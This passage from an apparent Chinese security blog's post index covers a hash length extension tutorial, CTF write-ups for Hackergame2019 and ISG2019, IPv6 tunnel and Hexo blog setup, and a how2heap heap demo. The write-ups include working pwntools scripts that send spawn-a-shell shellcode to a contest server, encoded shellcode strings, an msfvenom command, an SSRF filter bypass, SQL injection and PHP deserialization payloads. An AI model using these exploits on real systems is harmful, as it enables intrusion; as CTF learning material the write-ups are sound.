所以，服务器会检查我们发送的新数据，将它与上面的哈希值比对。现在，作为攻击者，我们要考虑的是如何生成这个值。 客户端计算怎么在不知道secret的情况下计算出那个值呢？ 首先，我们需要看一下我们要处理哪些数据：data, append, H, H(secret || data). 我们需要定义新函数H’，它与H使用同样的哈希函数，但开始状态是H(secret || data)的结束状态，即signature。然后我们就只要计算H'(append)，输出的就是我们要的哈希值。 12345678910111213141516171819202122232425#include &lt;stdio.h&gt;#include &lt;openssl/md5.h&gt;int main(int argc, const char *argv[]){ int i; unsigned char buffer[MD5_DIGEST_LENGTH]; MD5_CTX c; MD5_Init(&amp;c); MD5_Update(&amp;c, &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;, 64); c.A = htonl(0x6036708e); /* &lt;-- This is the hash we already had */ c.B = htonl(0xba0d11f6); c.C = htonl(0xef52ad44); c.D = htonl(0xe8b74d5b); MD5_Update(&amp;c, &quot;append&quot;, 6); /* This is the appended data. */ MD5_Final(buffer, &amp;c); for (i = 0; i &lt; 16; i++) { printf(&quot;%02x&quot;, buffer[i]); } printf(&quot;\\n&quot;); return 0;} 运行： 123$ gcc -o hash_extension_2 hash_extension_2.c -lssl -lcrypto$ ./hash_extension_2 结果与刚才的哈希值一致，但是区别在于，我们根本没有用到secret。简单地说：这段代码本质上就是用从新哈希值中得到的状态（四个链变量的值）去覆盖了四个初始链变量，随后再继续进行正常的哈希函数计算。 结果现在我们有字符串数据： 12340000 64 61 74 61 80 00 00 00 00 00 00 00 00 00 00 00 data............0010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................0020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................0030 00 00 50 00 00 00 00 00 00 00 61 70 70 65 6e 64 ..P.......append 以及H(secret || data || append)的哈希值： 16ee582a1669ce442f3719c47430dadee 并且，产生这一哈希值并不需要知道secret的值！我们发送这一数据，以及我们算出的新哈希值。服务器就会把secret放到前面，计算哈希，然后得到一个完全一致的哈希值，攻击完成。 工具使用方法： 12345$ ./hash_extender --data data --secret 6 --append append --signature 6036708eba0d11f6ef52ad44e8b74d5b --format md5Type: md5Secret length: 6New signature: 6ee582a1669ce442f3719c47430dadeeNew string: 64617461800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005000000000000000617070656e64 如果不清楚哈希函数的类型，可以尝试不同类型的函数，只要不设置--format参数即可。此时建议使用--table参数。 123$ ./hash_extender --data data --secret 6 --append append --signature 6036708eba0d11f6ef52ad44e8b74d5b --out-data-format html --tablemd4 89df68618821cd4c50dfccd57c79815b data80000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000P00000000000000appendmd5 6ee582a1669ce442f3719c47430dadee data80000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000P00000000000000append 关于输入输出的格式有很多选项，包括HTML（使用%NN表示法），C字符串（使用\\xNN表示法），十六进制表示等等。默认选项： 输入数据：raw 输入哈希值：hex 输出数据：hex 输出哈希值：hex 帮助页面供参考： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657--------------------------------------------------------------------------------HASH EXTENDER--------------------------------------------------------------------------------By Ron BowesSee LICENSE.txt for license information.Usage: ./hash_extender &lt;--data=|--file=&gt; --signature= --format= [options]INPUT OPTIONS-d --data= The original string that we're going to extend.--data-format= The format the string is being passed in as. Default: raw. Valid formats: raw, hex, html, cstr--file= As an alternative to specifying a string, this reads the original string as a file.-s --signature= The original signature.--signature-format= The format the signature is being passed in as. Default: hex. Valid formats: raw, hex, html, cstr-a --append= The data to append to the string. Default: raw.--append-format= Valid formats: raw, hex, html, cstr-f --format= [REQUIRED] The hash_type of the signature. This can be given multiple times if you want to try multiple signatures. 'all' will base the chosen types off the size of the signature and use the hash(es) that make sense. Valid types: md4, md5, ripemd160, sha, sha1, sha256, sha512, whirlpool-l --secret= The length of the secret, if known. Default: 8.--secret-min=--secret-max= Try different secret lengths (both options are required)OUTPUT OPTIONS--table Output the string in a table format.--out-data-format= Output data format. Valid formats: none, raw, hex, html, html-pure, cstr, cstr-pure, fancy--out-signature-format= Output signature format. Valid formats: none, raw, hex, html, html-pure, cstr, cstr-pure, fancyOTHER OPTIONS-h --help Display the usage (this).--test Run the test suite.-q --quiet Only output what's absolutely necessary (the output string and the signature) 其他工具有HashPump和Hexpand等，不过个人觉得不如hash_extender使用方便。 防御所以我们要如何防御这种攻击？实际上很简单，有两种方法： 可以的话，尽可能不要使用加密的数据或签名来认证用户 如果必须使用，可以使用HMAC算法而不是自己写这种算法 HMAC算法才是真正的解决之道，也就是将哈希值再哈希一次，如：H(secret || H(secret || data))。 此外，还可以将secret放在数据末尾，也就是H(data || secret)。由于服务器端会在末尾加secret，原来的attacker_controlled_data就变成了attacker_controlled_data || secret，由于不知道secret，攻击者也不能再控制哈希值。 参考文档：哈希长度拓展攻击(Hash Length Extension Attacks)Everything you need to know about hash length extension attacks","link":"/post/HashLenExtAtk/"},{"title":"Hackergame2019 比赛记录","text":"开拓眼界了。 签到题输入 token，F12 修改 button 属性，删掉disabled=&quot;disabled&quot;即可。 白与夜下载图片直接得 flag，以前见过这类题，图片会在不同背景下显示不同图像，所以改网页背景应该也是可以的。（所以直接得到 flag 的原因可能是因为我的系统主题是黑色的） 信息安全 2077F12 查看源码，发现需要特定的 UA 和If-Unmodified-Since请求头，因此先设定好 UA，然后利用 js 生成一个 2077 年 12 月的时间，仿照题目进行toUTCString转换就是需要的If-Unmodified-Since头，最后 POST 即可。 宇宙终极问题42参考链接 这也太新了。 123-805387388120759748043575814581751512602123297335631 Everything又要靠神仙网站救命了。 网页读取器12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from flask import Flask, render_template, request, send_from_directoryimport requests # well, requests is designed for humans, and I like it.app = Flask(__name__)whitelist_hostname = [&quot;example.com&quot;, &quot;www.example.com&quot;]whitelist_scheme = [&quot;http://&quot;]def check_hostname(url): for i in whitelist_scheme: if url.startswith(i): url = url[len(i):] # strip scheme url = url[url.find(&quot;@&quot;) + 1:] # strip userinfo if not url.find(&quot;/&quot;) == -1: url = url[:url.find(&quot;/&quot;)] # strip parts after authority if not url.find(&quot;:&quot;) == -1: url = url[:url.find(&quot;:&quot;)] # strip port if url not in whitelist_hostname: return (False, &quot;hostname {} not in whitelist&quot;.format(url)) return (True, &quot;ok&quot;) return (False, &quot;scheme not in whitelist, only {} allowed&quot;.format(whitelist_scheme))@app.route(&quot;/&quot;)def index(): return render_template(&quot;index.html&quot;)@app.route(&quot;/request&quot;)def req_route(): url = request.args.get('url') status, msg = check_hostname(url) if status is False: # print(msg) return msg try: r = requests.get(url, timeout=2) if not r.status_code == 200: return &quot;We tried accessing your url, but it does not return HTTP 200. Instead, it returns {}.&quot;.format(r.status_code) return r.text except requests.Timeout: return &quot;We tried our best, but it just timeout.&quot; except requests.RequestException: return &quot;While accessing your url, an exception occurred. There may be a problem with your url.&quot;@app.route(&quot;/source&quot;)def get_source(): return send_from_directory(&quot;/static/&quot;, &quot;app.py&quot;, as_attachment=True)if __name__ == '__main__': app.run(&quot;0.0.0.0&quot;, 8000, debug=False) 经过尝试，常规 SSRF 手段绕不过这个过滤器，但是由于没有对#进行处理，可以构造http://web1/flag#@example.com使得过滤器直接忽略@前的内容，此时再进行请求，则@example.com就会被解释为fragment了。 达拉崩吧大冒险一直以为是要对 websocket 做手脚，实际上并不能成功。这里我们提升攻击力的唯一途径就是去买鸡吃，我们在买鸡的时候 F12 一下： 发现这里的option的value是可以修改的，再看 js 代码： 这里直接将option的value填进去了，并没有检验其合法性，因此我们可以修改这个value使得其变成一个很大的数，但是这会导致我们钱不够买不了。 将一个数变得很大，除了增加它的值，还可以将它减少成一个非常小的负数，最终导致溢出，这里就是用的第二种方法。 8 字节能构成的最小的整数是： 1-9223372036854775808 那么我们先买-9223372036854775808只鸡，再买-1只鸡，我们的攻击力就会变成一个非常大的数9223372036854776000。 Happy LUG查一下资料可以发现这是PunyCode，题目中的 emoji 表情会被编码为xn--g28h，因此真实域名是xn--g28h.hack.ustclug.org。这个域名无法通过浏览器访问，但是却存在，说明一定存在一条对应的 DNS 记录，我们用nslookup查一下： 1$ nslookup -qt=ANY xn--g28h.hack.ustclug.org 8.8.8.8 就可以得到 flag。注意到返回的是“非权威记录”，这是由于ANY类型记录已经被废弃了。 正则验证器这些题目真的太新了。 题目限制了正则长度不超过 6，字符串长度不超过 24，要求构造一个运行时间大于 1 秒的正则。实际上就是ReDos 攻击。我们可以直接借用 wiki 上的例子： 12(a+)+$aaaaaaaaaaaaaaaaaaaaaaab 小巧玲珑的 ELFIDA 打开发现有一堆字符，然后对输入进行运算后与这 45 个字符进行比对，一致则输出correct，那么我们直接逆运算即可： 12345678v = [0x66,0x6E,0x65,0x6B,0x83,0x4E,0x6D,0x74,0x85,0x7A,0x6F,0x57,0x91,0x73,0x90,0x4F,0x8D,0x7F,0x63,0x36,0x6C,0x6E,0x87,0x69,0xA3,0x6F,0x58,0x73,0x66,0x56,0x93,0x9F,0x69,0x70,0x38,0x76,0x71,0x78,0x6F,0x63,0xC4,0x82,0x84,0xBE,0xBB,0xCD]for i in range(46): v[i] += i v[i] ^= i v[i] -= 2*iprint(bytes(v)) Shell 骇客1应该说是入门 pwn 题： 1234567// gcc -z execstack -fPIE -pie -z now chall1.c -o chall1int main() { char buf[0x200]; read(0, buf, 0x200); ((void(*)(void))buf)();} 这里可以直接执行用户输入，因此只需要写入shellcode即可： 12345678910111213from pwn import *context(arch='amd64', os='linux', log_level='DEBUG')# p = process('./chall1')p = remote('202.38.93.241', 10000)p.recvuntil(':')p.sendline('token') # tokenp.send(asm(shellcraft.sh()))p.interactive() 21234567891011// gcc -m32 -z execstack -fPIE -pie -z now chall2.c -o chall2int main() { char buf[0x200]; int n, i; n = read(0, buf, 0x200); if (n &lt;= 0) return 0; for (i = 0; i &lt; n; i++) { if(!((buf[i] &gt;= 65 &amp;&amp; buf[i] &lt;= 90) || (buf[i] &gt;= 48 &amp;&amp; buf[i] &lt;= 57))) return 0; } ((void(*)(void))buf)();} 这题在上一题的基础上限制了输入字符必须是大写字母或数字，并且是基于 x86 的。可以用类似ALPHA3的工具对shellcode进行转换。先将shellcode写入文件： 1234from pwn import *with open('shellcode.bin', 'w') as f: f.write(asm(shellcraft.sh())) 随后使用 ALPHA3 进行转化： 1$ py -2 ALPHA3.py x86 ascii uppercase eax --input=&quot;shellcode.bin&quot; 得到的结果就是新的 payload。 12345678910111213from pwn import *context.log_level = 'DEBUG'#p=process('./chall2')p = remote('202.38.93.241', 10002)p.recvuntil(':')p.sendline('token') # tokenp.send('PYVTX10X41PZ41H4A4I1TA71TADVTZ32PZNBFZDQC02DQD0D13DJE2O0Z2G7O1E7M04KO1P0S2L0Y3T3CKL0J0N000Q5A1W66MN0Y0X021U9J622A0H1Y0K3A7O5I3A114CKO0J1Y4Z5F06')p.interactive() 看到 flag 后发现，预期解是利用msfvenom生成shellcode： 1$ msfvenom -a x86 --platform linux -p linux/x86/exec CMD=&quot;/bin/sh&quot; -e x86/alpha_upper BufferRegister=eax 31234567891011// gcc -m64 -z execstack -fPIE -pie -z now chall3.c -o chall3int main() { char buf[0x400]; int n, i; n = read(0, buf, 0x400); if (n &lt;= 0) return 0; for (i = 0; i &lt; n; i++) { if(buf[i] &lt; 32 || buf[i] &gt; 126) return 0; } ((void(*)(void))buf)();} 本题的限制是shellcode由可打印字符构成，且基于 x64 平台。这个似乎靠msfvenom就不行了，但是可以换个工具，用shellcode_encoder： 1$ python2 main.py shellcode.bin rax+29 即可生成 payload，替换第二题的 payload 即可。注意rax+29指 shellcode 开始执行的位置。 12345678910111213from pwn import *context(log_level='DEBUG')p = remote('202.38.93.241', 10004)#p=process('./chall3')p.recvuntil(':')p.sendline('token') # tokenp.send('''PPTAYAXVI31VXXXf-c?f-@`f-@`PZTAYAXVI31VXPP[_Hc4:14:SX-b+e2-( _`5&gt;??_P^14:WX-????-}`aC-@`_}P_Hc4:14:SX-IOF`-A`! 5&gt;_7;P^14:WX-????-}`aC-@`_}P_Hc4:14:SX-&lt;hh)-h` 5n???P^14:WX-????-}`aC-@`_}P_Hc4:14:SX-@{#'-ux @5O6?_P^14:WX-????-}`aC-@`_}P_Hc4:14:SX-@#6p-B 0`5v?_?P^14:WX-????-}`aC-@`_}P_Hc4:14:SX-2 u@-&amp;@@ 5-_?wP^14:WX-????-}`aC-@`_}P_SX- ut*- ,Lv5X_?_P_Hc4:14:SX-Q !0-#@ 5s}.?P^14:WX-????-}`aC-@`_}P_SX-8 `$-%`&quot;|5?~}_P^SX-Ma`R-~c`p5-;?=P_AAAA!bt#MvAr*o$$&gt;I`_UXyyi;||s}_r=60d|jcEH(u'&amp;w6~7AM;wy4II+f'Gw+X#e0T|t30Q.$A&gt;6p?' B[A&lt;zDBH)6f0Rj#XO$''')p.interactive()","link":"/post/Hackergame2019/"},{"title":"开通 IPv6 隧道","text":"喜 迎 国 庆 新配置的代理服务器访问谷歌时，有时会遇到要求人机身份验证的问题。查找了一些资料后，发现应该是谷歌ban了对应的IPv4地址所导致的（说到这里，记录一个好用的网站）。 最简单的解决办法就是使用IPv6进行访问，为此我们需要开通一个IPv6隧道。在这个良心网站上注册个账号，然后Create Regular Tunnel，填写服务器IPv4地址并选择隧道服务器后，就能看到隧道的详细信息了。例如，Client IPv6 Address显示了我们的服务器的IPv6地址。 接下来，在Example Configurations中选择自己服务器的OS，并根据提示在服务器上完成相应配置即可。Debian和Ubuntu有自己的选项，CentOS及其它常用Linux系统可以选择Linux-net-tools。 至此，服务器已经可以通过IPv6访问谷歌了，测试： 1ping6 ipv6.google.com 注：可能需要在/etc/hosts中加入部分谷歌相关IPv6地址。","link":"/post/IPv6Tunnel/"},{"title":"Hexo踩坑记","text":"关于这个网站是如何诞生的。 我的博客终于从 CSDN 迁移过来了，一些太简单/太难的文章留在了 CSDN，只保留了一些我认为有价值的。从期末考试前到现在，这个网站搭建的我很辛苦，主要还是因为相关经验不足。 接下来记录的是搭建博客过程中踩过的坑，也汇集了很多来自其它博客的智慧。 GitHub Pages是的，我采用了比较容易的方式，也就是把博客交给 GitHub 托管。GitHub 提供的 GitHub Pages 功能实在是很良心。创建一个 repo，本地仓库里把 html,css,js 放上去就好了。 最初我并不了解 Hexo，所以手写了前端三件套。因为懒这个网站没有太大用处，放了几个按钮当作扩展收藏夹用。 HexoHexo 是基于 Node.js 的，所以首先需要到官网下载并安装，这样我们就拥有了非常好用的包管理工具 npm。随后，安装 hexo 只需要npm install -g hexo就搞定了。 在我们新建的用于存放网站文件的目录下hexo init，就像git init一样，即可初始化网站目录。生成静态页面只需要hexo g，实时调试使用hexo s后浏览器访问localhost:4000，部署到 GitHub 只需要hexo d。 说到部署，由于我之前已经配置过 Git，对 Git Bash 也比较熟悉，配置 SSH Key 之类的这里不详述。但我没想到，我以为很简单的部署环节，却标志着我踩坑之旅的开端。 部署先npm install hexo-deployer-git --save装好插件。 就是不看教程也能猜到，部署相关的配置就在根目录_config.yml中的deploy字段里。它长这样： 1234deploy: type: git repo: branch: master 也就是说把我的 repo 地址https://github.com/SignorMercurio/SignorMercurio.github.io.git填上去就好了。多亏 VSCode 提醒，我才发现 yml 的冒号后面必须要加空格。然而，当我 deploy 时，却得到了这样的错误信息： 大概是说发送 http 请求的时候出错了，我猜原因是采用 http 方式时，需要从标准输入读取 GitHub 用户名和密码信息，而在这里没能成功从标准输入中读取。 访问 GitHub 仓库一共就两种方式，http 不行我当然就试 SSH 了。把 repo 改成 1git@github.com:SignorMercurio/SignorMercurio.github.io.git 就成功了。 访问网站，便可以看到 Hexo 的经典默认主题 Landscape。此时，我不禁回想起在服务器上配置完 Nginx 后看到那个欢迎页面时的心情。随后我在 Hexo 官网上换了一个喜欢的主题。 其实过程中还因为误装了垃圾插件hexo-baidu-url-submit导致奇怪的报错，网上查阅后果断卸了。 配置 RSS我的主题还算良心，提供了配置 rss 的方法。首先安装插件：npm install hexo-generator-feed --save，随后在根目录_config.yml中加入： 1234567Plugins: - hexo-generator-feedfeed: type: atom path: atom.xml limit: 20 也就好了，其实没什么坑点，我也不是很在意 RSS 订阅什么的，真的会有人用这个嘛？ 配置 Mathjax这次被我的主题坑了。 主题中带有 mathjax 选项，但是设置为 true 后却没用。后来知道要这样设置： 123mathjax: enable: true per_page: true 而且在每篇文章的 Front-matter 里都需要加入mathjax: true，避免渲染没有用到公式的页面。 当我这样做了依然没有成效时，我就知道问题一定出在源头上了。 如果主题提供了 mathjax 支持，那么它要么是通过包含了相关文件实现的，要么是通过引用了外网上的相关文件实现的。一通乱翻后，我在主题文件夹的layout/_partial/mathjax.ejs中找到了罪魁祸首： 1&lt;script type=&quot;text/javascript&quot; src=&quot;http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML&quot;&gt; 这个 src 很明显就是提供 mathjax 支持的 js 文件了（上述第二种方式），但在 mathjax 官网上看了一眼，我发现 mathjax 现在已经换用了另一个 js 文件： 1&lt;script type=&quot;text/javascript&quot; src=&quot;https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML&quot;&gt; 用新的地址替换掉旧的即可。 分享功能设置主题自带的 share 太丑了，showshare 又存在一启用整个页面变白的奇怪 bug，于是只好用 baidushare，意外地发现还挺好看，而且和主题风格也一致（应该是主题已经改好的吧）。 结果这玩意儿在我后面换域名时给我带来了令人无语的麻烦。 网站访问计数感谢不蒜子的支持，网站访问计数的设置十分简单。在主题目录下的_config.yml中加入： 1234visit_counter: on: true site_visit: 极客到访数 page_visit: 本页阅读量 然后按照官网所述，在主题目录下的layout/_partial/footer.ejs里引入 js 脚本： 1234&lt;script async src=&quot;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt; 随后用主题内已有的代码就可以实现访问计数了。已有的代码其实也不过是条件判断+两个标签的安装而已。 Gitment 搭建这是最花时间的部分。虽然我很欣赏利用 issue 作为评论系统的想法和极简的设计理念，但是由于 Gitment 的 bug 和 feature 实在太多，导致我不知道在这上面踩了多少坑，我还是要吐槽一下 Gitment。搭建 Gitment 的时间可能超过了我搭建网站其它部分的时间之和。 众所周知，广受好评的多说挂了，畅言需要网站备案，disqus 需要魔法上网。虽然还有不少其它不错的评论系统可供使用，（我以为）Gitment 应该会是一个比较简单的解决方案。 于是跟着 Gitment 的文档，我开始动手： 1234567891011disqus: on: falsechangyan: on: falsegitment: on: true githubID: SignorMercurio repo: SignorMercurio.github.io client_id: client_secret: lazy: true 关掉了主题的disqus和changyan支持，使用gitment。创建了一个 OAuth 应用后输入了client_id和client_secret。其实这个 repo 字段我就试了挺久，因为不知道要不要完整的 repo 名、带.git 的仓库访问地址还是只要仓库名；也不知道是要 http 访问还是 ssh 访问。文档里没写。如果 repo 没有写对就会出现Error: Not Found。 这样以后基本的 Gitment 界面已经出现在了文章底部，显示需要登录才能评论。于是我点击登录，却发现跳回到了网站首页。这时，我注意到网址内容里多了一些错误信息，于是f12打开开发者工具查看问题。根据错误提示信息和开发者工具里的信息，我认为这是我在某处设置的一个叫做Callback URL的字段出了问题。回到之前注册 OAuth 应用，找到了Authorization callback URL这一字段，想必就是它了。设置为网站首页的网址即可（带 https）。 我以为分析完这个回调 URL 之后不会再遇上什么麻烦了，没想到登录后跳出了奇怪的对话框：[object ProgressEvent]，我完全不明白这是什么。在这个 Issue里才找到原因：原作者服务器证书过期了……在 ejs 源码里换了其他人搭建的服务器，问题似乎是解决了。 最后，当我初始化评论时，有些文章成功了，有些却失败了。这不科学啊？ 显然，这说明 Gitment 的评论初始化依赖于文章的某些属性。提示信息为Error: Validation Failed，我不太明白要验证什么，于是翻了翻 Gitment 的 Issue，果然找到了许多解决方案：有改 Gitment 源文件里的 id 的（这个也有好几种方法），有改 permalink 和 md 文件名的，有在 md 文件的 Front-matter 里添加字段的，还有一些我不是很明白原理的办法。这些方法的思想都是要把 id 缩短为 50 个字符以内以通过验证。 先是改 id 改出了奇怪的错误后，我决定采用两者结合的办法。在主题的layout/_partial/comments/gitment.ejs里把 id 字段改成window.location.pathname，原来默认是location.href。这样用于标识文章的 id 就变成了 md 文件的路径。随后在根目录的_config.yml里将permalink字段改为post/:title/，也就是说，每篇文章index.html放在 post 目录下以文章标题命名的目录里。 而这里的“文章标题”其实已经是文章对应的 md 文件的名字了。也就是说，这样做以后，只需要保证 md 文件的文件名不会太长即可，而这个文件名和文章实际的标题不需要保持一致。值得注意的是，由于编码转换的原因，特殊字符（比如空格）和中文到了网址里会变成多个字符，可能是因为这个原因（加上原来的permalink里还有日期）导致 id 超过了 50 个字符。 Gitment 调整在这个 Issue里发现了汉化版本，遗憾的是，这个版本的样式和我的主题风格不太相符，于是我打算下载下来放在 js 和 css 文件夹里，直接通过相对路径来引用。这样我就可以自己修改 css 了。 因为我至今不懂的原因，直接引用那个网站上的 js 文件不会出现的中文乱码问题，在我用相对路径引用时突然出现了。由于 Gitment 汉化工作量不大，我干脆借助查找功能把乱码去掉，重新自己汉化了一遍。 最后是调整 css 样式，因为是黑色主题，我将 Gitment 的评论和预览底色也设置为黑色，文字设置为灰色和白色，就像现在这个样子，看上去好多了。 CSS 调整与站内搜索我对这个主题的一部分样式还不是太满意，于是又调整了主题的 css，主要是让列表内的代码和行内代码样式统一。随后，在主题的_config.yml内添加了站内搜索功能，根据文章名搜索文章： 123search: path: search.json field: post 更换域名GitHub 十分良心地提供了 Student Pack，通过学生认证后就可以享受许多学生专有的福利，对于各种开发来说都十分方便。这里我用到了 Student Pack 中的 Namecheap 一年免费.me 域名以及一年免费 Positive SSL 证书。下单后，需要对域名进行配置。 点击 MANAGE 后选择 Advanced DNS，添加 Host Record。受到网上教程的误导，我添加了错误的 Host Record 导致一段时间内我的域名无法正确解析，也影响到了下面升级到 https 的操作。最终，查看了官方帮助文档后，才得知 GitHub Pages 的 IP 地址已经更新了……最终配置如下： 然后在网站根目录下添加CNAME文件，就一行signormercurio.me。 然而这个免费的 SSL 证书我却不太会用。查阅文档后，我发现这种 SSL 证书需要我在服务器端用 Nginx 生成 CSR，然后才会受到一个含有私钥和证书的压缩包，再把它部署到服务器上。然而，我的网站托管在 GitHub Pages 上，我根本不可能到服务器端操作！ 这样一来，我觉得我的免费 SSL 证书应该是废了，真是浪费啊。看着网站左上角的“不安全”字样，我开始思考如何升级到 https。 升级 https几经折腾，我发现我的 GitHub Pages 仓库的设置里，可以直接 Enforce HTTPS。在换域名之前就是 https，换了域名后 GitHub 当然也有办法设置 https 啊，那我之前干嘛去申请 SSL 证书？我早该想到这一点的。 然而我在 Namecheap 上的 Host Record，当时还是错的，于是没有办法升级。按照上文方法改对后，轻轻一勾，就享受到了来自伟大的 SSL/TLS 协议的保护。 但是这个时候，我的 baidushare 似乎不是很服气，直接罢工了。查了一下发现是因为 baidushare 不支持 https（拜托，都 2019 年了）。好在也有解决办法，来自这个 repo。 缺点就是每次如果需要hexo clean，那么就必须在hexo g后先把 static 文件夹拖进 public 里，然后再hexo d。不过也不算麻烦，因为并不是经常需要hexo clean。 2019.4.1 更新换了 Material X 主题，主要是因为 black-blue 代码显示的问题。又是一番折腾。 2019.5.16 更新更新了的 Material X 主题中不再需要手动捣鼓： Mathjax 评论功能（用 Valine 代替，Gitment 毕竟已经不再维护了） 分享功能 CSS 手动调整 站内搜索功能 升级 https 后分享功能调整 访问计数功能 这证明了使用一个处于积极维护中的主题是多么重要。 2020.2.25 更新更新至 Volantis 主题，配置上变化不太大。","link":"/post/Hexo/"},{"title":"ISG2019 线上赛部分记录","text":"题目难度不算大，但是考验脑洞。 签到题键盘密码，四个字母中间的那个字母就是明文。 传统安全服务初体验扫目录扫出许多路径，唯一有用的是/admin/upload.php，提示只能image或text/xml。设置Content-Type为text/xml上传一张普通图片发现可以成功，存储在upload/目录下，但是存在了1s就被删了，估计是要写脚本访问。 尝试访问/admin/upload/发现可以浏览目录，flag居然就直接就显示在这个目录下？？感觉像是非预期解。 攻击日志分析导出HTTP对象，WinRAR修复即可。 轻松一刻试着玩了一下之后发现生成了一个save1二进制文件，用WinHex打开只能看到3个ASCII字符2 A C，把2改成3之后载入游戏，发现来到了新的一关，因此猜测这个是关卡序号，逐次尝试后发现改成5可以得到flag。 安全专家的基本修养对图片binwalk分离出压缩包，根据提示five用5位数字爆破密码77777，得到字符串： 1QKM{Waoq_Fzuzns_kqaoc_!!!!_dk} 根据提示isg2019!，将其作为密钥进行维吉尼亚解密： 1ISG{Oiii_Ntmhhk_sksww_!!!!_vs} 但是答案错误，想了半天才知道第二个提示想不到是英文的吧意思是把密钥中的数字换成英语，即isgtwozeroonenine，重新维吉尼亚解密即可。 脑洞题没什么意思。但是如果能早点想到维吉尼亚密钥里不应该有数字的话，可能也不至于太需要脑洞？ web2忘记这题的名字了，总之很容易发现是注入题，在hint.php中的v1里输入一个'得到报错信息，尝试报错注入，最终payload类似： 1v1=1','2' or updatexml(1,concat(0x7e,(select temp.xxx from (select group_concat(kkk) as xxx from isgta61e) temp),0x7e),1),'3','4');#&amp;v2=&amp;v3=&amp;v4= payload中间部分的构造原因稍后解释。 其实如果按照报错注入的方式构造payload那么只能得到表里的信息，但是光看表里的信息并没有什么用，只能看到关键在于第二行（__ISG开头的那行）。这里的坑点在于，无论在hint.php中POST了什么，都会跳转到ffflllaaaggg.php，这个页面上只有一句话try get flag?，这句话本身是一个双关，是在提示我们用GET方法传flag参数，这一点感觉很脑洞…… 我们访问ffflllaaaggg.php?flag=后就可以得到ffflllaaaggg.php的源码： 12345678910111213141516&lt;?php include &quot;ISGClass.php&quot;; echo &quot;try get flag?&quot;; if(isset($_GET[&quot;flag&quot;])) { highlight_file(&quot;ffflllaaaggg.php&quot;); } if(isset($_COOKIE[&quot;ISG&quot;])){ highlight_file(&quot;ISGClass.php&quot;); $isg = urldecode($_COOKIE[&quot;ISG&quot;]); $isg = unserialize($isg); } if(isset($_POST[&quot;v1&quot;]) and isset($_POST[&quot;v2&quot;]) and isset($_POST[&quot;v3&quot;]) and isset($_POST[&quot;v4&quot;])){ $InsertData = new Conn(); $InsertData-&gt;InsertData($_POST[&quot;v1&quot;], $_POST[&quot;v2&quot;], $_POST[&quot;v3&quot;], $_POST[&quot;v4&quot;]); }?&gt; 这里注意到需要设置一个ISG的Cookie来读取ISGClass.php，这个Cookie值会被URL解码后反序列化。我们随意设置一个ISG的Cookie后查看源码： 12345678910111213141516171819&lt;?phpinclude &quot;Conn.php&quot;;class ISGClass{ var $value1; var $value2; public function __wakeup() { $Kkk = new Conn(); $Kkk = $Kkk-&gt;SelectData(); if(gettype($this-&gt;value1) == gettype($Kkk) and $this-&gt;value1 == $Kkk){ highlight_file(&quot;{$this-&gt;value2}.php&quot;); }else{ echo &quot;find kkk!&quot;; } }} PHP在反序列化前会先执行__wakeup()函数，这里我们不需要绕过这个函数。猜测这里的Kkk就是刚才我们查到的数据库里的kkk字段，那么我们需要构造value1使得其类型和值都与kkk相同。具体是哪个kkk呢？当然是标有ISG的第二行了，该行kkk值为54t7869yi。 这样以后我们就能读取value2指向的文件了，我们目前还没有读的就是hint.php。构造payload： 1O:8:&quot;ISGClass&quot;:2:{s:6:&quot;value1&quot;;s:9:&quot;54t7869yi&quot;;s:6:&quot;value2&quot;;s:4:&quot;hint&quot;;} 然后URL编码： 1O%3A8%3A%22ISGClass%22%3A2%3A%7Bs%3A6%3A%22value1%22%3Bs%3A9%3A%2254t7869yi%22%3Bs%3A6%3A%22value2%22%3Bs%3A4%3A%22hint%22%3B%7D 最后设置到CookieISG里，POST给ffflllaaaggg.php?flag=即可得到hint.php源码，flag就在其中。 这题get flag的双关既考验脑洞，又是解题的关键，所以略坑。 印象里还有一题SSRF的，利用的是PHP反序列化漏洞，然而环境无法复现了。。","link":"/post/ISG2019/"},{"title":"how2heap 学习","text":"距离文章发布两个多月后，终于更新完啦！ first_fit源码： 12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main(){ fprintf(stderr, &quot;This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.\\n&quot;); fprintf(stderr, &quot;glibc uses a first-fit algorithm to select a free chunk.\\n&quot;); fprintf(stderr, &quot;If a chunk is free and large enough, malloc will select this chunk.\\n&quot;); fprintf(stderr, &quot;This can be exploited in a use-after-free situation.\\n&quot;); fprintf(stderr, &quot;Allocating 2 buffers. They can be large, don't have to be fastbin.\\n&quot;); char* a = malloc(0x512); char* b = malloc(0x256); char* c; fprintf(stderr, &quot;1st malloc(0x512): %p\\n&quot;, a); fprintf(stderr, &quot;2nd malloc(0x256): %p\\n&quot;, b); fprintf(stderr, &quot;we could continue mallocing here...\\n&quot;); fprintf(stderr, &quot;now let's put a string at a that we can read later \\&quot;this is A!\\&quot;\\n&quot;); strcpy(a, &quot;this is A!&quot;); fprintf(stderr, &quot;first allocation %p points to %s\\n&quot;, a, a); fprintf(stderr, &quot;Freeing the first one...\\n&quot;); free(a); fprintf(stderr, &quot;We don't need to free anything again. As long as we allocate smaller than 0x512, it will end up at %p\\n&quot;, a); fprintf(stderr, &quot;So, let's allocate 0x500 bytes\\n&quot;); c = malloc(0x500); fprintf(stderr, &quot;3rd malloc(0x500): %p\\n&quot;, c); fprintf(stderr, &quot;And put a different string here, \\&quot;this is C!\\&quot;\\n&quot;); strcpy(c, &quot;this is C!&quot;); fprintf(stderr, &quot;3rd allocation %p points to %s\\n&quot;, c, c); fprintf(stderr, &quot;first allocation %p points to %s\\n&quot;, a, a); fprintf(stderr, &quot;If we reuse the first allocation, it now holds the data from the third allocation.\\n&quot;);} 